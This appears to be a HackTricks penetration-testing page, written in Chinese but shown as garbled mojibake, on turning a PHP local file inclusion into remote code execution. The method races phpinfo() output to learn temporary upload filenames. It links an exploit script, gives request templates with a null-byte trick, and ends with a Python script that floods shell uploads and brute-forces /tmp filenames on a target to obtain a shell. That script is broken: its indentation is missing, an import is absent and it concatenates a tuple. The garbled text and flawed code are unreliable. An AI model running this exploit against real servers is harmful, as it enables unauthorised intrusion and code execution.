<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ‚¨éœ€è¦ï¼š**ä¸€ä¸ªLFIæ¼æ´ï¼Œä¸€ä¸ªæ˜¾ç¤ºphpinfo()çš„é¡µé¢ï¼Œ"file\_uploads = on"ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¿…é¡»èƒ½å¤Ÿå†™å…¥"/tmp"ç›®å½•ã€‚**

[https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py)

**HTBæ•™ç¨‹**ï¼š[https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

æ‚¨éœ€è¦ä¿®å¤æ­¤æ¼æ´ï¼ˆå°†**=>**æ›´æ”¹ä¸º**=>**ï¼‰ã€‚æ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
æ‚¨éœ€è¦åœ¨æ¼æ´åˆ©ç”¨çš„å¼€å¤´æ›´æ”¹**payload**ï¼ˆä¾‹å¦‚ï¼Œç”¨äºphp-rev-shellçš„payloadï¼‰ï¼Œ**REQ1**ï¼ˆè¿™åº”è¯¥æŒ‡å‘phpinfoé¡µé¢ï¼Œå¹¶ä¸”åº”è¯¥åŒ…å«å¡«å……ï¼Œä¾‹å¦‚ï¼š_REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_ï¼‰ï¼Œä»¥åŠ**LFIREQ**ï¼ˆè¿™åº”è¯¥æŒ‡å‘LFIæ¼æ´ï¼Œä¾‹å¦‚ï¼š_LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ æ£€æŸ¥åœ¨åˆ©ç”¨ç©ºå­—ç¬¦æ—¶çš„åŒ"%"ï¼‰

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### ç†è®º

å¦‚æœPHPå…è®¸ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶ä¸”æ‚¨å°è¯•ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ™è¯¥æ–‡ä»¶å°†å­˜å‚¨åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œç›´åˆ°æœåŠ¡å™¨å®Œæˆå¤„ç†è¯·æ±‚ï¼Œç„¶ååˆ é™¤è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚

ç„¶åï¼Œå¦‚æœåœ¨WebæœåŠ¡å™¨ä¸­å‘ç°äº†LFIæ¼æ´ï¼Œæ‚¨å¯ä»¥å°è¯•çŒœæµ‹åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼Œå¹¶åœ¨å…¶è¢«åˆ é™¤ä¹‹å‰è®¿é—®ä¸´æ—¶æ–‡ä»¶ä»¥åˆ©ç”¨RCEã€‚

åœ¨**Windows**ä¸­ï¼Œæ–‡ä»¶é€šå¸¸å­˜å‚¨åœ¨**C:\Windows\temp\php<<**ä¸­ã€‚

åœ¨**Linux**ä¸­ï¼Œæ–‡ä»¶çš„åç§°é€šå¸¸æ˜¯**éšæœºçš„**ï¼Œå¹¶ä½äº**/tmp**ä¸­ã€‚ç”±äºåç§°æ˜¯éšæœºçš„ï¼Œå› æ­¤éœ€è¦ä»æŸä¸ªåœ°æ–¹**æå–ä¸´æ—¶æ–‡ä»¶çš„åç§°**å¹¶åœ¨å…¶è¢«åˆ é™¤ä¹‹å‰è®¿é—®å®ƒã€‚è¿™å¯ä»¥é€šè¿‡åœ¨å‡½æ•°â€œ**phpconfig()**â€çš„å†…å®¹ä¸­è¯»å–**å˜é‡$\_FILES**çš„å€¼æ¥å®Œæˆã€‚

**phpinfo()**

**PHP**ä½¿ç”¨**4096B**çš„ç¼“å†²åŒºï¼Œå½“ç¼“å†²åŒº**æ»¡**æ—¶ï¼Œå®ƒä¼š**å‘é€ç»™å®¢æˆ·ç«¯**ã€‚ç„¶åï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡**å‘é€å¤§é‡çš„å¤§è¯·æ±‚**ï¼ˆä½¿ç”¨å¤§çš„æ ‡å¤´ï¼‰**ä¸Šä¼ ä¸€ä¸ªphpåå‘shell**ï¼Œç­‰å¾…è¿”å›**phpinfo()çš„ç¬¬ä¸€éƒ¨åˆ†**ï¼ˆå…¶ä¸­åŒ…å«ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼‰ï¼Œå¹¶å°è¯•åœ¨phpæœåŠ¡å™¨åˆ é™¤æ–‡ä»¶ä¹‹å‰åˆ©ç”¨LFIæ¼æ´è®¿é—®ä¸´æ—¶æ–‡ä»¶ã€‚

**ç”¨äºå°è¯•æš´åŠ›ç ´è§£åç§°çš„Pythonè„šæœ¬ï¼ˆå¦‚æœé•¿åº¦ä¸º6ï¼‰**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
